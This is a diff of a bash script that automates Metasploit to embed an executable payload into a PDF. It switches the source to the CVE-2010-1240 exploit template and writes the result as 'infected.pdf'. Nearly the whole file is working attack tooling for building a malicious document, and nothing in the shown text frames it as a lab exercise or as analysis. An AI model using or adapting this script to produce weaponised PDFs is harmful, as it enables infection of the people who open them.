@@ -1,7 +1,8 @@
 #!/bin/bash
 
 
-PDF_ORIGINAL="pdf/rib_clean.pdf"
+# PDF_ORIGINAL="pdf/rib_clean.pdf"
+PDF_ORIGINAL="/usr/share/metasploit-framework/data/exploits/CVE-2010-1240/template.pdf"
 EXE_PAYLOAD="pdf/payload.exe"
 OUTPUT_NAME="pdf/output/infected.pdf"
 
@@ -14,4 +15,4 @@ echo "set EXE::CUSTOM $EXE_PAYLOAD" >> $SCRIPT_FILE
 echo "exploit" >> $SCRIPT_FILE
 echo "exit" >> $SCRIPT_FILE
 
-msfconsole -r $SCRIPT_FILE
+msfconsole -q -r $SCRIPT_FILE
